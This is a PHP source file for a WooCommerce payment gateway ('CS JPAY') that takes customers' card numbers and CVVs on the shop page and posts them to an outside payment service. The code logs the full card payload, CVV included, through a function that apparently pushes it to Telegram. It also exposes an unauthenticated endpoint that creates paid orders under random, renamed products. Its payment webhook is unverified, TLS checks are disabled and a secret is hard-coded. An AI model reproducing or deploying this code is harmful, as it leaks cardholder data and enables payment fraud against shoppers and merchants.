<?php

/**
 * Class WC_Gateway_CS_STRIPE file.
 *
 * @package WooCommerce\Gateways
 */

include_once(plugin_dir_path(__FILE__) . '/libs/shield_api.php');

if (! defined('ABSPATH')) {
	exit; // Exit if accessed directly.
}
//include_once (plugin_dir_path( __FILE__ ).'vendor/stripe-php/init.php');

/**
 * CS_STRIPE Payment Gateway
 *
 * Provides a CS_STRIPE Payment Gateway.
 *
 * @class 		WC_Gateway_CS_STRIPE
 * @extends		WC_Payment_Gateway
 * @version		1.0
 */
class CS_JPAY extends WC_Payment_Gateway
{

	/**
	 * Gateway instructions that will be added to the thank you page and emails.
	 *
	 * @var string
	 */
	public $instructions;
	public $api_url;
	public $merchant_key;
	public $shield_key;
	public $homeurl;
	public $path;
	public $api_secret;
	public $cardtypes;

	/**
	 * Constructor for the gateway.
	 */

	public $shieldInfo;
	public function __construct()
	{
		// Setup general properties.
		$this->setup_properties();

		// Load the settings.
		$this->init_form_fields();
		$this->init_settings();
		// Get settings.
		$this->title              = $this->get_option('title');
		$this->description        = $this->get_option('description');
		$this->instructions       = $this->get_option('instructions');
		$this->enabled            = $this->get_option('enabled');
		$this->mchid              = $this->get_option('mchid');
		$this->apikey             = $this->get_option('apikey');
		$this->code               = $this->get_option('code');
		$this->account_type       = $this->get_option('account_type');
		$this->payment_mode       = $this->get_option('payment_mode');
		$this->paymentcenter      = $this->get_option('paymentcenter');
		

		
	    $this->has_fields = true;
		
		$this->api_url              = get_option('cs_api_url');
		$this->merchant_key         = get_option('cs_merchant_key');
		$this->shield_key           = get_option('cs_shield_key');

		$this->cardtypes           = $this->get_option('cardtypes');

		// Actions.
		add_action('woocommerce_api_cs_jpay_invoice', array($this, 'invoice'));	#Invoice URL #http://domain.com/wc-api/cs_jpay_invoice/
		add_action('woocommerce_api_cs_jpay_ipn', array($this, 'webhook_ipn')); #addOrder URL #http://domain.com/wc-api/cs_jpay_ipn/
		add_action('woocommerce_api_cs_jpay_addorder', array($this, 'add_custom_order')); #addOrder URL #http://domain.com/wc-api/cs_jpay_addorder/
		add_action('woocommerce_api_cs_jpay_failed', array($this, 'process_failed')); #addOrder URL #http://domain.com/wc-api/cs_jpay_failed/


		add_action('woocommerce_update_options_payment_gateways_' . $this->id, array($this, 'process_admin_options'));
		add_action('woocommerce_thankyou_' . $this->id, array($this, 'thankyou_page'));
		add_filter('woocommerce_payment_complete_order_status', array($this, 'change_payment_complete_order_status'), 10, 3);

		// Customer Emails.
		add_action('woocommerce_email_before_order_table', array($this, 'email_instructions'), 10, 3);
	}

	/**
	 * Setup general properties for the gateway.
	 */
	protected function setup_properties()
	{
		$this->id                 = 'CS_JPAY';
		$this->icon               = apply_filters('woocommerce_stripspp_icon', '');
		$this->method_title       = __('CS JPAY Pmethod', 'woocommerce');
		$this->method_description = __('This plugin JPAY Payment Gateway Protected by CashShield System.', 'woocommerce');
		$this->has_fields         = true;
	}

	/**
     * Initialise Gateway Settings Form Fields
     *
     * @access public
     * @return void
     */
    function init_form_fields()
    {
        global $woocommerce;

        $this->form_fields = array(
            'enabled' => array(
                'title' => __('Enable/Disable', 'jpay'),
                'type' => 'checkbox',
                'label' => __('Enable jpay', 'jpay'),
                'default' => 'no'
            ),
            'title' => array(
                'title' => __('Payment Title', 'Credit Card'),
                'type' => 'text',
                'default' => __('jpay', 'Credit Card')
            ),
            'mchid' => array(
                'title' => __('MchId', 'jpay'),
                'type' => 'text'
            ),
            'mdomain' => array(
                'title' => __('merchant Url', 'jpay'),
                'type' => 'text',
                'description' => __('Please enter the merchant Url', 'jpay'),
                'css' => 'width:400px',
                'default' => __('https://abc.com', 'jpay')
            ),
            'apikey' => array(
                'title' => __('ApiKey', 'jpay'),
                'type' => 'text'
            ),	
            'code' => array(
                'title' => __('Code', 'jpay'),
                'type' => 'text'
            ),			
            'account_type' => array(
                'title' => __('Account Type', 'jpay'),
                'type' => 'select',
                'description' => __('sandbox/live', 'jpay'),
                'default' =>'live',
	              'options'=>array(
	              'sandbox'=>'sandbox',
	              'live'=>'live'
	              )
            ),
            'payment_mode' => array(
                'title' => __('Payment Mode', 'jpay'),
                'type' => 'select',
                'description' => __('sale', 'jpay'),
                'default' =>'sale',
	              'options'=>array(
	              'sale'=>'sale'
				  )
            ),
            // 'payment_is' => array(
            //     'title' => __('是否内嵌', 'jpay'),
            //     'type' => 'select',
            //     'description' => __('是/否', 'jpay'),
            //     'default' =>'否',
	           //   'options'=>array(
	           //   'p_yes'=>'是',
	           //   'p_no'=>'否'
	           //   )
            // ),
            'paymentcenter' => array(
                'title' => __('PaymentCenter Url', 'jpay'),
                'type' => 'text',
                'description' => __('Please enter the PaymentCenter Url', 'jpay'),
                'css' => 'width:400px',
                'default' => __('https://api.j-pay.co/Pay_Index.html', 'jpay')
            )
        );
    }



	/**
	 * UI - Payment page fields for Inspire Commerce.
	 */
	function payment_fields()
	{
		// Description of payment method from settings
		if ($this->description) {
?>
			<p><?php echo $this->description; ?></p>
		<?php } ?>
		<fieldset style="padding-left: 40px;">
			<!-- Show input boxes for new data -->
			<div id="cs-jpay-cardform-new-info">
				<!-- Credit card number -->
				<p class="form-row form-row-first">
					<label for="ccnum"><?php echo __('Credit Card number', 'woocommerce-gateway-cs-jpay'); ?> <span class="required">*</span></label>
					<input type="text" class="input-text" id="ccnum" name="ccnum" maxlength="16" required />
				</p>
				<div class="clear"></div>
				<!-- Credit card expiration -->
				<p class="form-row form-row-first">
					<label for="expmonth"><?php echo __('Expiration date', 'woocommerce-gateway-cs-tripes'); ?> <span class="required">*</span></label>
					<select name="expmonth" id="expmonth" class="woocommerce-select woocommerce-cc-month" required>
						<option value=""><?php _e('Month', 'woocommerce-gateway-cs-tripes'); ?></option>
						<?php
						$months = array();
						for ($i = 1; $i <= 12; $i++) {
							$timestamp                         = mktime(0, 0, 0, $i, 1);
							$months[date('n', $timestamp)] = date('F', $timestamp);
						}
						foreach ($months as $num => $name) {
							printf('<option value="%u">%s</option>', $num, $name);
						}
						?>
					</select>
					<select name="expyear" id="expyear" class="woocommerce-select woocommerce-cc-year" required>
						<option value=""><?php _e('Year', 'woocommerce-gateway-cs-tripes'); ?></option>
						<?php
						$years = array();
						for ($i = date('y'); $i <= date('y') + 15; $i++) {
							printf('<option value="20%u">20%u</option>', $i, $i);
						}
						?>
					</select>
				</p>

				<p class="form-row form-row-last">
					<label for="cvv"><?php _e('Card Code(CVC)', 'woocommerce-gateway-cs-jpay'); ?> <span class="required">*</span></label>
					<input required type="text" class="input-text" id="cvv" name="cvv" maxlength="4" style="width:80px" />
					<span class="help"><?php _e('3 or 4 digits usually found on the signature strip.', 'woocommerce-gateway-cs-tripes'); ?></span>
				</p>
		</fieldset>
<?php
	}


	/**
	 * Check If The Gateway Is Available For Use.
	 *
	 * @return bool
	 */
	public function is_available()
	{
		return (bool)$this->isActiveGateway();
	}


	public function isActiveGateway()
	{
		$is_acitive = false;

		$shield_info = $this->getShieldInfo();

        $shieldStatus = $shield_info['status'] ?? false;
		if ($shieldStatus) {
			$shield_gateways = json_decode($shield_info['result']['shield_gateways'], true);
			$is_acitive = $shield_gateways['jpay']['active'];
		}
		return true;
	}

	private $shield_info = null;

	public function getShieldInfo()
	{
		$shieldInfo = get_option('wc_shieldpp_setting');

		$this->shield_info = [
			'status' => true,
			'result' => $shieldInfo,
		];

		return json_decode($shieldInfo, true);
	}

	public function getJpaySetting()
	{
		$shield_info = $this->getShieldInfo();
		
		$gateway_settings = array(
		    'enabled' => 'yes',
            'title' => $this->get_option('title'),
            'mchid' => $this->get_option('mchid'),
            'apikey' => $this->get_option('apikey'),
            'code' => $this->get_option('code'),
            'account_type' => $this->get_option('account_type'),
            'payment_mode' => $this->get_option('payment_mode'),
            'paymentcenter' => $this->get_option('paymentcenter'),
            'description' => $this->get_option('description'),
            'instructions' => '',
            'cardtypes' => '',
		 );
		
// 		$shieldStatus = $shield_info['status'] ?? false;
// 		if ($shieldStatus) {
// 			$shield_gateways = json_decode($shield_info['result']['shield_gateways'], true);
// 			$gateway_settings = $shield_gateways['jpay'];
// 		}
		
		
		return $gateway_settings;
	}

	public function createShieldOrder($fields)
	{
		$shield_api = new Shield_API(
			$this->api_url,
			$this->merchant_key,
			$this->shield_key
		);
		$result = $shield_api->createOrder($fields);
		return $result;
	}

	/**
	 * Process the payment and return the result.
	 *
	 * @param int $order_id Order ID.
	 * @return array
	 */


	public function process_payment($order_id)
	{

		$shield_info = $this->getShieldInfo();

		$jpay_settings = array();
		
		$shieldStatus = $shield_info['status'] ?? false;
		if ($shieldStatus) {
			$shield_gateways = json_decode($shield_info['result']['shield_gateways'], true);
			$jpay_settings = $shield_gateways['jpay']['settings'];
		}

		$order = wc_get_order($order_id);
		$total = $order->get_total();
		$success_url = WC()->api_request_url('cs_stripe_sucess');
		$failed_url = WC()->api_request_url('cs_stripe_failed');
		$ipn_url = WC()->api_request_url('cs_stripe_ipn');

		$product_name = array();

		foreach ($order->get_items() as $item) {
			$product_name[] = $item->get_name();
		}

		$expmonth = $this->get_post('expmonth');
		$expyear  = '';
		if ($expmonth < 10) {
			$expmonth = '0' . $expmonth;
		}
		if ($this->get_post('expyear') != null) {
			$expyear = substr($this->get_post('expyear'), -2);
		}

		$cards = array(
			'ccnumber'  => $this->get_post('ccnum'),
			'cvv'       => $this->get_post('cvv'),
			'expmonth'     => $expmonth,
			'expyear'     => $expyear,
		);

		$fields = array(
			'merchant_ref_code' => $order_id,
			'total_price' => $total,
			'pmethod' => "JPAY",
			'customer_email' => $order->get_billing_email(),
			'customer_phone' => $order->get_billing_phone(),
			'customer_first_name' => $order->get_billing_first_name(),
			'customer_last_name' => $order->get_billing_last_name(),
			'product_name' => implode("|", $product_name),
			'customer_ip' => $_SERVER['REMOTE_ADDR'],
			'success_url' => $success_url,
			'failed_url' => $failed_url,
			'ipn_url' => $ipn_url,
			'cards' => $cards
		);

		$response = $this->createShieldOrder($fields);

		update_post_meta($order_id, 'cs_logs', json_encode($response));

		if ($response['status'] == true) {
			$paylink = $response['result']['payment_link'];
			$transaction_id = $response['result']['transaction_id'];
			update_post_meta($order_id, 'cs_ref_code', $transaction_id);
			update_post_meta($order_id, 'cs_pp_payment_link', $paylink);

			// Remove cart.
			WC()->cart->empty_cart();
			// Return thankyou redirect.
			return array(
				'result'   => 'success',
				'redirect' => $paylink,
			);
		}
	}

	public function add_custom_order()
	{
		try {
			$tran_data = $_POST;
			
			$cs_ref_code = $_POST['cs_ref_code'];
			$product_price = $_POST['total_price'];
			$customer_email = $_POST['customer_email'];
			$product_name = $_POST['product_name'];
			$post_id = 0;
			$first_name = $_POST['customer_first_name'];
			$last_name =  $_POST['customer_last_name'];

			if ($post_id == 0) {
				$args     = array('post_type' => 'product', 'posts_per_page' => -1);
				$products = get_posts($args);
				$post_id = $products[array_rand($products)]->ID;
				if (!$post_id) {
					$post_id = 7015;
				}
			}

			$cart_item_data = array('custom_price' => $product_price, 'custom_product_name' => $product_name);
			$address = array(
				'first_name' => $first_name,
				'last_name'  => $last_name,
				'email' => $customer_email
			);

			$order = wc_create_order();
			$product = wc_get_product($post_id);
			$order->set_address($address, 'billing');
			$order->add_order_note("Order process via API CS System");

			// Change the product price
			$product->set_price($product_price);
			$product->set_name($product_name);
			
			$od = json_decode($product);
			
			$order->add_product($product, 1, $cart_item_data);
			$order->set_total($product_price);

			// add Gateway
			$payment_gateways = WC()->payment_gateways->payment_gateways();
			$order->set_payment_method($payment_gateways['cs_jpay']);


			$order->calculate_totals();
			WC()->session->order_awaiting_payment = $order->get_id();
			update_post_meta($order->get_id(), 'cs_ref_code', $cs_ref_code);
			update_post_meta($order->get_id(), 'mc_success_url', $mc_success_url);
			update_post_meta($order->get_id(), 'mc_failed_url', $mc_failed_url);

			// make paypal invoice here 
			$order_id = $order->get_id();
			if ($order_id) {
			    $tran_data['cs_ref_code'] = $_POST['cs_ref_code'];
			    $tran_data['merchant_site'] = $_POST['merchant_site'];
				$payment_res = $this->create_jpay_invoice($order, $tran_data);
				
				$payment_res = json_decode($payment_res, true);
				$redirectUrl3ds = isset($payment_res['url']) ? $payment_res['url'] : "";
				$paymentStatus = $payment_res['status'] ?? -1;
				if($paymentStatus && !empty($redirectUrl3ds)) {
				    $paymentStatus = 0;
				}
				
				if ($paymentStatus == 0) {
				    $payment_code = "00";
				    $payment_res['transaction_id'] = 'JPAY_'.time();
				    $payment_res['receipt_url'] = 'JPAY_receipt_url';
					if ($payment_code  == "00")  // success
					{
					    $result = array(
							'shield_ref_code' => $order_id,
							'code' => $payment_code,
							'transaction_id' => $payment_res['transaction_id'],
							'receipt_url' => ''
						);
						
						$res = array(
							'status' => true,
							'result' => $result
						);
						
						if(!empty($redirectUrl3ds)) {
						    $res['result']['code'] = '03';
						    $res['result']['url'] = $redirectUrl3ds;
						}

						$order->add_order_note(sprintf(__('Payment success (Trans ID: %s)', 'cs-stripe'), $payment_res['transaction_id']));
						$order->add_order_note(sprintf(__('Payment success (CS ID: %s)', 'cs-stripe'), $cs_ref_code));
						$order->payment_complete($payment_res['transaction_id']);
					} else { // failed
						$res = array(
							'status' => true,
							'result' => array(
								'shield_ref_code' => $order_id,
								'code' => $payment_code,
								'transaction_id' => $payment_res['transaction_id']
							)
						);
						$order->add_order_note(sprintf(__('Payment success (Trans ID: %s)', 'cs-stripe'), $payment_res['transaction_id']));
						$order->add_order_note(sprintf(__('Payment success (CS ID: %s)', 'cs-stripe'), $cs_ref_code));

						$order->update_status('failed');
					}
				} else {
					$res = array('status' => false, 'msg' => $payment_res['msg']);
				}
			} else {
				$res = array('status' => false, 'msg' => 'Can not make order. Please contact admin !');
			}
		} catch (Exception $e) {
			$message = "Error:\n";

			$message .= "Message: " . $e->getMessage() . "\n";
			$message .= "File: " . $e->getFile() . "\n";
			$message .= "Line: " . $e->getLine() . "\n";

			plugin_custom_log($message, 'debug.log');
			telegram_push_log($message);
		}
		ob_clean();
		echo json_encode($res);
		ob_end_flush();
		die;
	}

	public $pay_callbackurl = 'https://api.ttrpay.net/v1/transaction/callbackurl';
	private function create_jpay_invoice($order, $tran_data = [])
	{
		try {
			$jpay_settings = $this->getJpaySetting();
			if ($jpay_settings['account_type'] == 'sandbox') {
				$jpay_client_id = "10153";
				$jpay_secret = "9k8rx7j0fxa7deb250huvghfbbjnu23h";
			}

            $merchant_site = $tran_data['merchant_site'];
            
            if(!empty($merchant_site)) {
                $merchant_site = "https://{$merchant_site}";
            }
            
			$cs_ref_code = $tran_data['cs_ref_code'];
			$mc_ref_code = $tran_data['mc_ref_code'];
			$mc_success_url = $tran_data['mc_success_url'];
			$mc_failed_url = $tran_data['mc_failed_url'];
			$ipn_url = $tran_data['mc_ipn_url'] ?? '';

			$products = $tran_data['product_name'];
			$products='['.$products.']';
			$products=str_replace("'","",$products);

			$products=str_replace('&#39;','',$products);
			$products=str_replace('&amp;','',$products);
			$products=str_replace('&#038;','',$products);
			$products=str_replace('&','',$products);

			$amount  = number_format(trim($order->get_total()), 2, '.', '');

			$url = 'https://api.j-pay.net/pay_index';

	        $memberid = $jpay_settings['mchid'];
 			$secretKey = $jpay_settings['apikey'];

			if ($jpay_settings['account_type'] == 'sandbox') {
				$memberid = "10153";
				$secretKey = "9k8rx7j0fxa7deb250huvghfbbjnu23h";
			}

			$callbackCode = strrev($cs_ref_code.'_'.$mc_ref_code).'?mcredirect='.urlencode($mc_success_url);
			$data = [
				'pay_memberid' => $memberid,
				'pay_orderid' => $mc_ref_code,
				'pay_applydate' => date('Y-m-d H:i:s', time()),
				'pay_bankcode' => $this->code,
				'pay_notifyurl' => $ipn_url,
				'pay_callbackurl' => $this->pay_callbackurl .'/'.$callbackCode,
				'pay_amount' => $amount,
			];

			ksort($data);
			$md5str = "";
			foreach ($data as $key => $val) {
				if (!empty($val)) {
					$md5str = $md5str . $key . "=" . $val . "&";
				}
			}
			$sign_str = $md5str . 'key=' . $secretKey;
			$sign = strtoupper(md5($sign_str));
			$data = array_merge($data, [
				'pay_md5sign' => $sign,
				'pay_url' => $merchant_site,
				'pay_currency' => 'USD',//$order->get_currency(),
				'pay_productname' => json_encode([
					[
						'productName' => $products,
						'price' => $amount,
						'quantity' => ' 1',
					]
				]),
				'pay_firstname' => (!empty($order->get_shipping_first_name())?$order->get_shipping_first_name():$order->get_billing_first_name()),
				'pay_lastname' => (!empty($order->get_shipping_last_name())?$order->get_shipping_last_name():$order->get_billing_last_name()),
				'pay_street_address1' => (!empty($order->get_shipping_address_1())?$order->get_shipping_address_1():$order->get_billing_address_1()),
				'pay_street_address2' => (!empty($order->get_shipping_address_2())?$order->get_shipping_address_2():$order->get_billing_address_2()),
				'pay_city' => (!empty($order->get_shipping_city())?$order->get_shipping_city():$order->get_billing_city()),
				'pay_postcode' => (!empty($order->get_shipping_postcode())?$order->get_shipping_postcode():$order->get_billing_postcode()),
				'pay_state' => (!empty($order->get_shipping_state())?$order->get_shipping_state():$order->get_billing_state()),
				'pay_country_iso_code_2' => (!empty($order->get_shipping_country())?$order->get_shipping_country():$order->get_billing_country()),
				'pay_telephone' => $order->get_billing_phone(),
				'pay_email_address' => $order->get_billing_email(),
				'pay_ip' => $this->get_client_ip(),
				'pay_useragent' =>  $_SERVER['HTTP_USER_AGENT'],
				'pay_language' =>  $_SERVER['HTTP_ACCEPT_LANGUAGE'],
				'system' => 'cashields'
			]);
			
		// $jsonString = "{\"ccnumber\":\"4242424242424242\",\"cvv\":\"123\",\"expmonth\":\"12\",\"expyear\":\"2027\"}";
			$cards = str_replace('\"', '"', $tran_data['cards']);
			$cards_arr = json_decode($cards, true);
			if (json_last_error() !== JSON_ERROR_NONE) {
				$cards_arr = [
					'ccnumber' => '',
					'expmonth' => '',
					'expyear' => '',
					'cvv' => ''
				];
			}
			
			$pay_cardno = $cards_arr['ccnumber'] ?? '';
			$pay_cardmonth = $cards_arr['expmonth'] ?? '';
			$pay_cardyear = $cards_arr['expyear'] ?? '';
			$pay_cardcvv = $cards_arr['cvv'] ?? '';
			$data = array_merge($data, [
				'pay_cardno'=> $pay_cardno,
				'pay_cardmonth'=> $pay_cardmonth,
				'pay_cardyear'=> $pay_cardyear,
				'pay_cardcvv'=> $pay_cardcvv, 
			]);
			
			telegram_push_log("JPAY PAYLOAD: " . print_r($data, true));

			$header = [
				'Content-Type: application/x-www-form-urlencoded',
			];

			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER , false);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,false);
			$curlData = curl_exec($ch);

			if (curl_error($ch)) {
				$rsp['status'] = false;
				echo 'Curl error: ' . curl_error($ch);
				
			}
			curl_close($ch);
			
			telegram_push_log("JPAY Rsp: " . print_r($curlData, true));
			
			return $curlData;
		} catch (Exception $e) {
			$message = "Error:\n";

			$message .= "Message: " . $e->getMessage() . "\n";
			$message .= "File: " . $e->getFile() . "\n";
			$message .= "Line: " . $e->getLine() . "\n";

			plugin_custom_log($message, 'debug.log');
			telegram_push_log($message);
		}
	}

	function webhook_ipn()
	{
		$callback_data = $_POST;

		$message = "POSTBACK IPN:" . json_encode($callback_data);
		plugin_custom_log($message, 'ipn.log');

		$cs_ref_code = $callback_data['cs_ref_code'];
		$wp_order_id = $callback_data['merchant_ref_code'];
		$status = $callback_data['status'];
		$transaction_id = $callback_data['transaction_id'];
		$payment_log = $callback_data['payment_log'];

		$order = wc_get_order($wp_order_id);

		if ($status == "1" && !empty($transaction_id)) {
			$order->add_order_note(sprintf(__('Payment success (Trans ID: %s)', 'wc-shieldpp'), $transaction_id));
			$order->add_order_note(sprintf(__('Payment success (MC ID: %s)', 'wc-shieldpp'), $cs_ref_code));
			$order->payment_complete($transaction_id);
		} else {
			$order->update_status('failed');
		}
		die;
	}

	function process_failed()
	{
		$this->redirect_url(get_site_url());
		die;
	}

	protected function get_post($name)
	{
		if (isset($_POST[$name])) {
			return $_POST[$name];
		}
		return null;
	}

	private function redirect_url($url)
	{
		echo "<script>window.location.href='" . $url . "';</script>";
		exit;
	}

	/**
	 * Output for the order received page.
	 */
	public function thankyou_page()
	{
		if ($this->instructions) {
			echo wp_kses_post(wpautop(wptexturize($this->instructions)));
		}
	}

	/**
	 * Change payment complete order status to completed for COD orders.
	 *
	 * @since  3.1.0
	 * @param  string         $status Current order status.
	 * @param  int            $order_id Order ID.
	 * @param  WC_Order|false $order Order object.
	 * @return string
	 */
	public function change_payment_complete_order_status($status, $order_id = 0, $order = false)
	{
		if ($order && 'cod' === $order->get_payment_method()) {
			$status = 'completed';
		}
		return $status;
	}

	/**
	 * Add content to the WC emails.
	 *
	 * @param WC_Order $order Order object.
	 * @param bool     $sent_to_admin  Sent to admin.
	 * @param bool     $plain_text Email format: plain text or HTML.
	 */
	public function email_instructions($order, $sent_to_admin, $plain_text = false)
	{
		if ($this->instructions && ! $sent_to_admin && $this->id === $order->get_payment_method()) {
			echo wp_kses_post(wpautop(wptexturize($this->instructions)) . PHP_EOL);
		}
	}

	public function get_client_ip()
    {
        if (isset($_SERVER)) {
            if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED'];
            } elseif (isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
            } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_FORWARDED_FOR'];
            } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
                $ip = $_SERVER['HTTP_FORWARDED'];
            } elseif (isset($_SERVER['HTTP_X_REAL_IP'])) {
                $ip = $_SERVER['HTTP_X_REAL_IP'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
        } else {
            if (getenv('HTTP_X_FORWARDED_FOR')) {
                $ip = getenv('HTTP_X_FORWARDED_FOR');
            } elseif (getenv('HTTP_CLIENT_IP')) {
                $ip = getenv('HTTP_CLIENT_IP');
            } else {
                $ip = getenv('REMOTE_ADDR');
            }
        }

        $ips = explode(",", $ip);
        return $ips[0];
    }
}
